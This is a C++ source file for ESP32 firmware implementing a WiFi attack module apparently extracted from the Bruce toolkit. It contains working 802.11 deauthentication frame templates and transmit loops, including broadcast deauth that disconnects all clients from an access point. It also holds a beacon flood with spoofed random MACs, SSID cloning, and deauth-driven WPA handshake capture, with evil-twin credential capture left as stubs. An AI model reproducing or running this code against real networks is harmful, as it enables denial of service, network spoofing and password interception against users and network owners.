/**
 * @file BruceWiFi.cpp
 * @brief Lean WiFi attack adapter - extracted essentials from Bruce
 *
 * Contains only the raw frame logic needed for attacks.
 * No menu code, no UI code, no bloat.
 */

#include "BruceWiFi.h"
#include <esp_wifi.h>
#include <esp_err.h>

namespace Assessor {

// Static instance for promiscuous callback
BruceWiFi* BruceWiFi::s_instance = nullptr;

// =============================================================================
// FRAME TEMPLATES (from Bruce wifi_atks.h)
// =============================================================================

// Deauth frame: 26 bytes
// [0-1]   Frame control (0xC0 0x00 = deauth)
// [2-3]   Duration
// [4-9]   Destination MAC (target client or broadcast)
// [10-15] Source MAC (AP BSSID)
// [16-21] BSSID
// [22-23] Sequence
// [24-25] Reason code (0x02 = Previous auth no longer valid)
static const uint8_t DEAUTH_FRAME_TEMPLATE[] = {
    0xC0, 0x00,                         // Frame control: Deauth
    0x3A, 0x01,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: To be filled
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: To be filled
    0xF0, 0xFF,                         // Sequence
    0x02, 0x00                          // Reason: Auth no longer valid
};
constexpr size_t DEAUTH_FRAME_LEN = sizeof(DEAUTH_FRAME_TEMPLATE);

// Beacon frame: 109 bytes (simplified)
static const uint8_t BEACON_FRAME_TEMPLATE[] = {
    0x80, 0x00,                         // Frame control: Beacon
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: To be filled
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: To be filled
    0x00, 0x00,                         // Sequence
    // Timestamp (8 bytes)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    // Beacon interval
    0x64, 0x00,
    // Capability info
    0x31, 0x04,
    // SSID element (tag 0, length, then SSID bytes)
    0x00, 0x20,  // Tag: SSID, Length: 32 (max)
    // 32 bytes for SSID (padded with spaces)
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    // Supported rates
    0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C,
    // DS Parameter Set (channel)
    0x03, 0x01, 0x01,  // Channel: To be filled at byte 82
    // TIM
    0x05, 0x04, 0x00, 0x01, 0x00, 0x00
};
constexpr size_t BEACON_FRAME_LEN = sizeof(BEACON_FRAME_TEMPLATE);
constexpr size_t BEACON_SSID_OFFSET = 38;
constexpr size_t BEACON_SSID_LEN_OFFSET = 37;
constexpr size_t BEACON_CHANNEL_OFFSET = 82;
constexpr size_t BEACON_SRC_OFFSET = 10;
constexpr size_t BEACON_BSSID_OFFSET = 16;

// =============================================================================
// SINGLETON
// =============================================================================

BruceWiFi& BruceWiFi::getInstance() {
    static BruceWiFi instance;
    return instance;
}

BruceWiFi::BruceWiFi()
    : m_state(WiFiAdapterState::IDLE)
    , m_initialized(false)
    , m_promiscuousEnabled(false)
    , m_currentChannel(1)
    , m_packetsSent(0)
    , m_lastPacketMs(0)
    , m_handshakeCaptured(false)
{
    memset(m_attackTargetMac, 0, 6);
    memset(m_attackApMac, 0, 6);
    s_instance = this;
}

BruceWiFi::~BruceWiFi() {
    shutdown();
    s_instance = nullptr;
}

// =============================================================================
// LIFECYCLE
// =============================================================================

bool BruceWiFi::init() {
    if (m_initialized) return true;

    // Initialize WiFi in station mode first
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();

    // Initialize ESP WiFi for raw frame access
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    if (esp_wifi_init(&cfg) != ESP_OK) {
        return false;
    }

    if (esp_wifi_set_mode(WIFI_MODE_STA) != ESP_OK) {
        return false;
    }

    if (esp_wifi_start() != ESP_OK) {
        return false;
    }

    m_initialized = true;
    m_state = WiFiAdapterState::IDLE;
    return true;
}

void BruceWiFi::shutdown() {
    stopAttack();
    setPromiscuous(false);
    esp_wifi_stop();
    m_initialized = false;
    m_state = WiFiAdapterState::IDLE;
}

void BruceWiFi::tick() {
    if (!m_initialized) return;

    switch (m_state) {
        case WiFiAdapterState::SCANNING:
            tickScan();
            break;
        case WiFiAdapterState::DEAUTHING:
            tickDeauth();
            break;
        case WiFiAdapterState::BEACON_FLOODING:
            tickBeaconFlood();
            break;
        case WiFiAdapterState::CAPTURING_HANDSHAKE:
            tickHandshakeCapture();
            break;
        case WiFiAdapterState::MONITORING:
            tickMonitor();
            break;
        default:
            break;
    }
}

WiFiAdapterState BruceWiFi::getState() const {
    return m_state;
}

// =============================================================================
// SCANNING (Async)
// =============================================================================

void BruceWiFi::beginScan() {
    if (m_state != WiFiAdapterState::IDLE) {
        stopAttack();
    }

    // Start async scan
    WiFi.scanNetworks(true, true);  // async=true, show_hidden=true
    m_state = WiFiAdapterState::SCANNING;
}

void BruceWiFi::stopScan() {
    WiFi.scanDelete();
    m_state = WiFiAdapterState::IDLE;
}

bool BruceWiFi::isScanComplete() const {
    return WiFi.scanComplete() >= 0;
}

int BruceWiFi::getScanResultCount() const {
    int result = WiFi.scanComplete();
    return (result >= 0) ? result : 0;
}

bool BruceWiFi::getScanResult(int index, ScanResultEntry& result) const {
    int count = WiFi.scanComplete();
    if (count < 0 || index >= count) {
        return false;
    }

    // Copy BSSID
    uint8_t* bssid = WiFi.BSSID(index);
    if (bssid) {
        memcpy(result.bssid, bssid, 6);
    }

    // Copy SSID
    String ssid = WiFi.SSID(index);
    strncpy(result.ssid, ssid.c_str(), 32);
    result.ssid[32] = '\0';

    result.rssi = WiFi.RSSI(index);
    result.channel = WiFi.channel(index);
    result.encryptionType = WiFi.encryptionType(index);

    return true;
}

void BruceWiFi::onScanComplete(ScanCompleteCallback cb) {
    m_onScanComplete = cb;
}

void BruceWiFi::tickScan() {
    int result = WiFi.scanComplete();
    if (result >= 0) {
        m_state = WiFiAdapterState::IDLE;
        if (m_onScanComplete) {
            m_onScanComplete(result);
        }
    }
}

// =============================================================================
// DEAUTHENTICATION
// =============================================================================

bool BruceWiFi::deauthStation(const uint8_t* stationMac,
                               const uint8_t* apMac,
                               uint8_t channel) {
    if (!m_initialized) return false;

    stopAttack();
    setChannel(channel);

    memcpy(m_attackTargetMac, stationMac, 6);
    memcpy(m_attackApMac, apMac, 6);
    m_packetsSent = 0;
    m_lastPacketMs = 0;
    m_state = WiFiAdapterState::DEAUTHING;

    return true;
}

bool BruceWiFi::deauthAll(const uint8_t* apMac, uint8_t channel) {
    // Broadcast deauth - target FF:FF:FF:FF:FF:FF
    static const uint8_t broadcast[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    return deauthStation(broadcast, apMac, channel);
}

void BruceWiFi::tickDeauth() {
    uint32_t now = millis();
    if (now - m_lastPacketMs < DEAUTH_INTERVAL_MS) {
        return;
    }
    m_lastPacketMs = now;

    // Build deauth frame
    uint8_t frame[DEAUTH_FRAME_LEN];
    memcpy(frame, DEAUTH_FRAME_TEMPLATE, DEAUTH_FRAME_LEN);

    // Set destination (client or broadcast)
    memcpy(&frame[4], m_attackTargetMac, 6);
    // Set source (AP BSSID)
    memcpy(&frame[10], m_attackApMac, 6);
    // Set BSSID
    memcpy(&frame[16], m_attackApMac, 6);

    // Send frame 3 times (like Bruce does)
    sendRawFrame(frame, DEAUTH_FRAME_LEN);
    sendRawFrame(frame, DEAUTH_FRAME_LEN);
    sendRawFrame(frame, DEAUTH_FRAME_LEN);

    m_packetsSent += 3;

    if (m_onAttackProgress) {
        m_onAttackProgress(m_packetsSent);
    }
}

// =============================================================================
// BEACON FLOOD
// =============================================================================

// Beacon flood state
static const char** s_beaconSsids = nullptr;
static size_t s_beaconSsidCount = 0;
static size_t s_beaconCurrentIndex = 0;
static uint8_t s_beaconChannel = 1;

bool BruceWiFi::beaconFlood(const char** ssids, size_t count, uint8_t channel) {
    if (!m_initialized || count == 0) return false;

    stopAttack();
    setChannel(channel);

    s_beaconSsids = ssids;
    s_beaconSsidCount = count;
    s_beaconCurrentIndex = 0;
    s_beaconChannel = channel;

    m_packetsSent = 0;
    m_lastPacketMs = 0;
    m_state = WiFiAdapterState::BEACON_FLOODING;

    return true;
}

bool BruceWiFi::cloneBeacon(const char* ssid,
                             const uint8_t* bssid,
                             uint8_t channel) {
    static const char* singleSsid[1];
    singleSsid[0] = ssid;

    // Store BSSID to use (or generate random if null)
    if (bssid) {
        memcpy(m_attackApMac, bssid, 6);
    } else {
        // Random MAC
        for (int i = 0; i < 6; i++) {
            m_attackApMac[i] = random(256);
        }
        m_attackApMac[0] &= 0xFE;  // Unicast
        m_attackApMac[0] |= 0x02;  // Locally administered
    }

    return beaconFlood(singleSsid, 1, channel);
}

void BruceWiFi::tickBeaconFlood() {
    uint32_t now = millis();
    if (now - m_lastPacketMs < BEACON_INTERVAL_MS) {
        return;
    }
    m_lastPacketMs = now;

    if (!s_beaconSsids || s_beaconSsidCount == 0) {
        m_state = WiFiAdapterState::IDLE;
        return;
    }

    // Build beacon frame
    uint8_t frame[BEACON_FRAME_LEN];
    memcpy(frame, BEACON_FRAME_TEMPLATE, BEACON_FRAME_LEN);

    // Generate random BSSID for this beacon
    uint8_t bssid[6];
    for (int i = 0; i < 6; i++) {
        bssid[i] = random(256);
    }
    bssid[0] &= 0xFE;  // Unicast
    bssid[0] |= 0x02;  // Locally administered

    // Set source and BSSID
    memcpy(&frame[BEACON_SRC_OFFSET], bssid, 6);
    memcpy(&frame[BEACON_BSSID_OFFSET], bssid, 6);

    // Set SSID
    const char* ssid = s_beaconSsids[s_beaconCurrentIndex];
    size_t ssidLen = strlen(ssid);
    if (ssidLen > 32) ssidLen = 32;

    frame[BEACON_SSID_LEN_OFFSET] = ssidLen;
    memset(&frame[BEACON_SSID_OFFSET], 0, 32);
    memcpy(&frame[BEACON_SSID_OFFSET], ssid, ssidLen);

    // Set channel
    frame[BEACON_CHANNEL_OFFSET] = s_beaconChannel;

    // Send beacon
    sendRawFrame(frame, BEACON_FRAME_LEN);
    m_packetsSent++;

    // Rotate to next SSID
    s_beaconCurrentIndex = (s_beaconCurrentIndex + 1) % s_beaconSsidCount;

    if (m_onAttackProgress) {
        m_onAttackProgress(m_packetsSent);
    }
}

// =============================================================================
// HANDSHAKE CAPTURE (Stub - needs promiscuous mode)
// =============================================================================

bool BruceWiFi::captureHandshake(const uint8_t* apMac,
                                  uint8_t channel,
                                  bool sendDeauth) {
    if (!m_initialized) return false;

    stopAttack();
    setChannel(channel);
    setPromiscuous(true);

    memcpy(m_attackApMac, apMac, 6);
    m_handshakeCaptured = false;
    m_state = WiFiAdapterState::CAPTURING_HANDSHAKE;

    // Optionally send deauth to force reconnect
    if (sendDeauth) {
        static const uint8_t broadcast[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        memcpy(m_attackTargetMac, broadcast, 6);
    }

    return true;
}

bool BruceWiFi::hasHandshake() const {
    return m_handshakeCaptured;
}

bool BruceWiFi::saveHandshake(const char* filename) {
    // TODO: Implement PCAP saving
    return false;
}

void BruceWiFi::onHandshakeCaptured(HandshakeCapturedCallback cb) {
    m_onHandshakeCaptured = cb;
}

void BruceWiFi::tickHandshakeCapture() {
    // Send periodic deauth to force reconnection
    uint32_t now = millis();
    if (now - m_lastPacketMs >= 500) {  // Every 500ms
        m_lastPacketMs = now;

        uint8_t frame[DEAUTH_FRAME_LEN];
        memcpy(frame, DEAUTH_FRAME_TEMPLATE, DEAUTH_FRAME_LEN);
        memcpy(&frame[4], m_attackTargetMac, 6);
        memcpy(&frame[10], m_attackApMac, 6);
        memcpy(&frame[16], m_attackApMac, 6);

        sendRawFrame(frame, DEAUTH_FRAME_LEN);
        m_packetsSent++;
    }

    // Handshake detection happens in promiscuous callback
}

// =============================================================================
// EVIL TWIN (Stub)
// =============================================================================

bool BruceWiFi::startEvilTwin(const char* ssid,
                               uint8_t channel,
                               bool sendDeauth) {
    // TODO: Implement evil twin with captive portal
    return false;
}

void BruceWiFi::stopEvilTwin() {
    if (m_state == WiFiAdapterState::EVIL_TWIN_ACTIVE) {
        m_state = WiFiAdapterState::IDLE;
    }
}

int BruceWiFi::getCapturedCredentialCount() const {
    return 0;  // TODO
}

void BruceWiFi::onCredentialCaptured(CredentialCapturedCallback cb) {
    m_onCredentialCaptured = cb;
}

// =============================================================================
// PASSIVE MONITORING
// =============================================================================

bool BruceWiFi::startMonitor(uint8_t channel) {
    if (!m_initialized) return false;

    stopAttack();
    if (channel > 0) {
        setChannel(channel);
    }
    setPromiscuous(true);

    m_state = WiFiAdapterState::MONITORING;
    return true;
}

void BruceWiFi::stopMonitor() {
    if (m_state == WiFiAdapterState::MONITORING) {
        setPromiscuous(false);
        m_state = WiFiAdapterState::IDLE;
    }
}

void BruceWiFi::onPacketReceived(PacketCallback cb) {
    m_onPacketReceived = cb;
}

void BruceWiFi::tickMonitor() {
    // Packet handling happens in promiscuous callback
}

// =============================================================================
// ATTACK CONTROL
// =============================================================================

void BruceWiFi::stopAttack() {
    setPromiscuous(false);
    m_state = WiFiAdapterState::IDLE;
    m_packetsSent = 0;
}

uint32_t BruceWiFi::getPacketsSent() const {
    return m_packetsSent;
}

void BruceWiFi::onAttackProgress(AttackProgressCallback cb) {
    m_onAttackProgress = cb;
}

// =============================================================================
// LOW-LEVEL
// =============================================================================

bool BruceWiFi::sendRawFrame(const uint8_t* frame, size_t len) {
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
    return (result == ESP_OK);
}

bool BruceWiFi::setChannel(uint8_t channel) {
    if (channel < 1 || channel > 14) return false;

    esp_err_t result = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (result == ESP_OK) {
        m_currentChannel = channel;
        return true;
    }
    return false;
}

bool BruceWiFi::setPromiscuous(bool enable) {
    esp_err_t result;

    if (enable && !m_promiscuousEnabled) {
        esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);
        result = esp_wifi_set_promiscuous(true);
        m_promiscuousEnabled = (result == ESP_OK);
    } else if (!enable && m_promiscuousEnabled) {
        result = esp_wifi_set_promiscuous(false);
        m_promiscuousEnabled = false;
    }

    return m_promiscuousEnabled == enable;
}

// =============================================================================
// PROMISCUOUS CALLBACK
// =============================================================================

void BruceWiFi::promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!s_instance) return;

    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* payload = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    int8_t rssi = pkt->rx_ctrl.rssi;

    // Forward to packet callback if registered
    if (s_instance->m_onPacketReceived) {
        s_instance->m_onPacketReceived(payload, len, rssi);
    }

    // TODO: EAPOL detection for handshake capture
    // Check for EAPOL frames (type 0x888E)
    // If all 4 EAPOL messages seen, mark handshake captured
}

} // namespace Assessor
